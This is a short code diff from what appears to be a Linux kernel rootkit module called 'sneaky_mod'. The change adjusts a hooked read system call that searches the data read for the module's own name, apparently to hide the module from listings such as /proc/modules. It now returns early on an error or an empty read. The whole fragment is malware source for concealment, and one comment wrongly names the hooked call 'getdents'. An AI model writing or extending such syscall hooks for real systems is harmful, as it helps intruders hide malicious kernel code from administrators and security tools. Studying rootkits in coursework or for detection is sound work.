@@ -122,8 +122,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
 
   // Call the original 'getdents'
   numBytes = original_read(fd, buf, count);
-  if (numBytes == -1) {
-    return -1;
+  if (numBytes == -1 || numBytes == 0) {
+    return numBytes;
   }
 
   begin = strstr(buf, "sneaky_mod ");
